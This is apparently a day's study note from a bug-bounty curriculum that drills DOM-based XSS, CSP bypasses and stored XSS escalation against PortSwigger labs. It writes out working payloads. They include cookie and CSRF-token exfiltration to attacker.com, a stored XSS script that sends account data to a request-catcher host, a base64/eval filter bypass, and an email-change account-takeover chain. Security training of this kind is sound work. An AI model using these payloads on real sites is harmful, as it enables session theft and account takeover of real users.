---
title: "Weak Area Reinforcement Day 3 — Advanced XSS and DOM Exploitation"
tags: [reinforcement, XSS, DOM, CSP-bypass, stored-XSS, chaining, practice, bug-bounty]
module: 05-BugBountyOps-02
day: 318
related_topics:
  - Weak Area Reinforcement Day 2 (Day 317)
  - XSS and CSRF Exploitation (Day 127)
  - Web Exploitation (R-02)
---

# Day 318 — Weak Area Reinforcement Day 3: Advanced XSS and DOM Exploitation

---

## Goals

Drill XSS beyond the basic `<script>alert(1)</script>`.
Focus on DOM-based XSS, CSP bypass techniques, and stored XSS with impact escalation.

**Time budget:** 3 hours.

---

## Part 1 — DOM-Based XSS

### Recon: DOM XSS vs Reflected XSS

```
Reflected XSS: server echoes input into HTML response → browser executes.
DOM XSS:       JavaScript on the page reads a source (URL hash, document.referrer,
               postMessage) and writes it to a sink without sanitization.
               The server never sees the payload.

Common DOM XSS sources:
  document.location.hash
  document.URL
  document.referrer
  window.name
  postMessage (cross-origin)

Common DOM XSS sinks:
  element.innerHTML = SOURCE          → XSS if SOURCE contains HTML
  eval(SOURCE)                        → XSS if SOURCE contains JS
  document.write(SOURCE)              → XSS
  element.src = SOURCE                → XSS if javascript: URI
  jQuery.html(SOURCE)                 → XSS
  location.href = SOURCE              → open redirect or XSS via javascript:
```

### Exploit Lab

```bash
# PortSwigger: "DOM XSS in document.write sink using source location.search"
# Vulnerable code: document.write('<img src="' + params.get('query') + '">');

# Payload to break out of img attribute and inject script:
# URL: https://LAB/?query="><svg onload=alert(1)>

# PortSwigger: "DOM XSS in innerHTML sink using source location.search"
# Vulnerable code: element.innerHTML = searchTerm;
# Note: <script> tags do NOT execute via innerHTML in modern browsers
# Use an event handler instead:
# URL: https://LAB/?query=<img src=x onerror=alert(1)>

# PortSwigger: "DOM XSS via postMessage"
# Listen for messages, insecurely assign to innerHTML
# Create an iframe on your server that sends a malicious postMessage:
<iframe src="https://LAB/" onload="
  this.contentWindow.postMessage('<img src=x onerror=alert(document.cookie)>','*')
">
```

```
DOM XSS lab 1 completed: Y/N   Payload used: ___
DOM XSS lab 2 completed: Y/N   Payload used: ___
DOM XSS lab 3 completed: Y/N   Payload used: ___
```

---

## Part 2 — CSP Bypass

### Recon: Content Security Policy

```
CSP is a response header that restricts which scripts can execute.
Understanding the policy is required to bypass it.

Common weak CSP patterns:

1. unsafe-inline allowed:
   Content-Security-Policy: script-src 'self' 'unsafe-inline'
   → Normal <script>alert(1)</script> works.

2. Whitelisted CDN domain:
   Content-Security-Policy: script-src https://cdn.trusted.com
   → If trusted CDN hosts user content or has JSONP endpoints:
     <script src="https://cdn.trusted.com/callback?payload=alert(1)"></script>

3. 'nonce-based' CSP but nonce predictable:
   Content-Security-Policy: script-src 'nonce-ABC123'
   → If nonce is static/predictable, reuse it.
   → If nonce is per-page but leaked in referer, grab and reuse.

4. object-src or base-uri not set:
   → inject <base href="https://attacker.com/"> to redirect JS loading

5. script-src 'strict-dynamic':
   → If you can inject into an existing allowed script, you can load more scripts
```

### Exploit Lab

```bash
# PortSwigger: "Reflected XSS with some SVG markup allowed"
# CSP blocks script but allows SVG — use SVG animate event:
# <svg><animatetransform onbegin=alert(1)></animatetransform></svg>

# PortSwigger: "Reflected XSS protected by very strict CSP, with dangling markup attack"
# Can't execute JS — instead exfiltrate CSRF token via img src attribute:
# <img src='https://attacker.com/steal?token=
# (dangling markup — captures HTML until next quote)
```

```
CSP bypass lab 1 completed: Y/N   Technique: ___
CSP bypass lab 2 completed: Y/N   Technique: ___

CSP bypass technique that worked on this app: ___
Why the policy was weak: ___
```

---

## Part 3 — Stored XSS with Impact Escalation

### Recon: Proving XSS Impact in Bug Bounty

```
alert(1) is not impact. It is proof of execution.
Bug bounty programmes pay based on impact. You must demonstrate:

Level 1 — Confirm execution:
  alert(document.domain)  → prove correct domain

Level 2 — Cookie theft:
  fetch('https://attacker.com/steal?c='+document.cookie)
  Note: works only if cookie lacks HttpOnly flag

Level 3 — Session hijack (HttpOnly present):
  Perform an authenticated action as the victim:
  fetch('/api/change-email', {method:'POST',
    body:JSON.stringify({email:'attacker@x.com'}),
    credentials:'include'})
  → CSRF via XSS bypasses CSRF tokens since same-origin

Level 4 — Account takeover:
  Chain: stored XSS → change email → password reset to new email

Level 5 — Admin action:
  If XSS fires in admin panel → create new admin user, export data, etc.
```

### Exploit

```javascript
// Stored XSS payload — steal session action (no cookie required)
// Inject into a comment / profile / any stored field

fetch('/api/account', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://YOUR.requestcatcher.com/x?data='+btoa(JSON.stringify(d))))

// Payload with encoding to bypass naive filters
<svg/onload="eval(atob('BASE64_OF_ABOVE_SCRIPT'))">
```

```
Stored XSS location found: ___
Impact demonstrated: ___
Victim action performed: ___
```

---

## Post-Drill Rating

```
Area                    | Before | After
------------------------|--------|-------
XSS — reflected         |   /5   |  /5
XSS — DOM-based         |   /5   |  /5
XSS — CSP bypass        |   /5   |  /5
XSS — stored + impact   |   /5   |  /5

Single insight that changed my XSS approach:
  ___
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q318.1, Q318.2 …).

---

## Navigation

← Previous: [Day 317 — Weak Area Reinforcement Day 2](DAY-0317-Weak-Area-Reinforcement-Day-02.md)
→ Next: [Day 319 — Weak Area Reinforcement Day 4](DAY-0319-Weak-Area-Reinforcement-Day-04.md)
